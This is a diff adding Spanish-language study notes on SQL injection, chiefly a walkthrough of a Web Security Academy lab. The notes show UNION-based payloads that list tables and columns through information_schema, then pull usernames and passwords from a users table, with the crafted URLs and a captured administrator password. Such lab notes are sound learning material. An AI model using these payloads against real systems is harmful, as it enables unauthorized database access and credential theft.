@@ -320,6 +320,77 @@ PASS:ubkfkbwgny54kk6o2yx2
 
 FUENTE DE LOS COMANDOS STACKOVERFLOW
 ```
+### Obtener multiples valores en una comluna
+Seuan logico, la respuesta es concatenar, la caul se le puede añadir un caracter como separador para conocer el inicio y fin de la información, los comandos de concatenación y caracteres pueden cambiar segun la base de datos, a continuaci´´on un ejemplo de concatenación en Oracle
+
+```
+Concatenación en Oracle, los caracteres de concatenación son "||" 
+' UNION SELECT username || '~' || password FROM users--
+```
+### Laboratorio  Obtener multiples valores en una comluna
+
+1.- Identificar el parametro bulnerable (nos dicen que es filter) # si es filter
+2.- Veririfcar la cantidad (este solo sera 1) # son 2 parametros concatenados
+3.- Identificar el tipo de dato (int, varchar, bool, etc) # es prostgreSQL
+4.- Obtener información interesante o requerida //Obtener las credenciales de administrador
+NOTA: Recuerda lo aprendido de como listar bd, tablas y columnas, parece que serán necesarias
+
+```
+SELECT PRODUCTNAME FROM PRODUCTS WHERE CATEGORY='DSADAS'
+
+SELECT PRODUCTNAME FROM PRODUCTS WHERE CATEGORY='DSADAS'+UNION+SELECT+FROM+DUAL
+AND WHERE EXISTS
+
+ya estaba concatenadando
+
+PASO 1
+
+Crei que solo era un parametro que se estaba enviando pero me equivoque me parece que me confie con el enunciado, al parecer se estaba concatenando los resultado y no veia la respuesta, solo veia errores, en fin es una consulta que concatena los valores
+
+PASO 2 CONOCER EL NUMEERO DE PARAMETROS
+
+PASO 3 CONOCE EL TIPO DE BASE DATOS
+
+PASO 4 IDENTIFICAR EL NOMBRE DE LAS TABLAS
+table_name,NULL FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--
+
+table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE'--
+
+https://0a8a00ce04022d5083478d6500f70030.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+NULL,table_name%20FROM%20information_schema.tables%20WHERE%20table_schema=%27public%27%20AND%20table_type=%27BASE%20TABLE%27--
+
+RESULTADO
+USERS
+PRODUCTS
+
+PASO 5 IDENTIFICAR EL NOMBRE DE LAS COLUMNAS
+
+SELECT table_name FROM information_schema.tables WHERE table_schema='public' AND table_type='BASE TABLE';
+
+SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'table';
+
+column_name FROM information_schema.columns WHERE table_name = 'users';
+
+RESULTADO
+email
+password
+username
+
+ULTIMO PASO REALIZAR CONSULTA
+
+username||'#' || password FROM users
+https://ID.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+NULL,username||%27#'%20||%20password%20FROM%20users--
+
+https://ID.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+NULL,username||%27+%27||password+FROM+users--
+//sin espacios
+administrator
+nc3xtl7hr3fiq7ljojoc
+
+
+```
+
+
+
+
 Con UNION
 1. Determinar la cantidas de elementos *Verifica la sintaxis*
 2. Determinar el tipo de datos
